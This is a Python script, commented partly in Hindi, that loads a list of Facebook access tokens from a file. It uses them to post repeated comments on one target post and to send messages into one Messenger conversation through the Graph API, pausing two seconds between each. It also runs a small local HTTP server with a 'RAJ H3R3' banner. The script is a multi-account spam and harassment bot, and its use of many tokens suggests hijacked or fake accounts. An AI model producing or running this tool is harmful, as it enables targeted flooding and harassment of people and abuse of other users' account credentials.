import requests
import json
import time
import threading
import http.server
import socketserver

# ✅ HTTP Server Setup (Optional)
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"-- SERVER RUNNING >> RAJ H3R3")

def execute_server():
    PORT = 4000
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("✅ Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

# ✅ Facebook Post पर Comment करने का Function
def post_comment():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    with open('postid.txt', 'r') as file:
        post_id = file.read().strip()  # जिस पोस्ट पर कमेंट करना है

    with open('File.txt', 'r') as file:
        comments = file.readlines()  # कमेंट्स की लिस्ट

    for i, token in enumerate(tokens):
        access_token = token.strip()
        comment_message = comments[i % len(comments)].strip()

        url = f"https://graph.facebook.com/v17.0/{post_id}/comments"
        params = {
            "message": comment_message,
            "access_token": access_token
        }

        response = requests.post(url, data=params)

        if response.ok:
            print(f"✅ Comment {i+1} Posted: {comment_message}")
        else:
            print(f"❌ Failed to Post Comment {i+1}: {response.text}")

        time.sleep(2)  # 2 सेकंड का गैप

# ✅ Messenger (DMs) में Message भेजने का Function
def send_messages():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()

    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()  # चैट ID

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    for i, token in enumerate(tokens):
        access_token = token.strip()
        message = messages[i % len(messages)].strip()

        url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
        params = {"access_token": access_token, "message": message}
        response = requests.post(url, json=params)

        if response.ok:
            print(f"✅ Message {i+1} Sent: {message}")
        else:
            print(f"❌ Failed to Send Message {i+1}: {response.text}")

        time.sleep(2)

# ✅ Main Function
def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    # 🟢 Messenger पर Message भेजें
    send_messages()

    # 🟢 Post पर Comment करें
    post_comment()

if __name__ == '__main__':
    main()
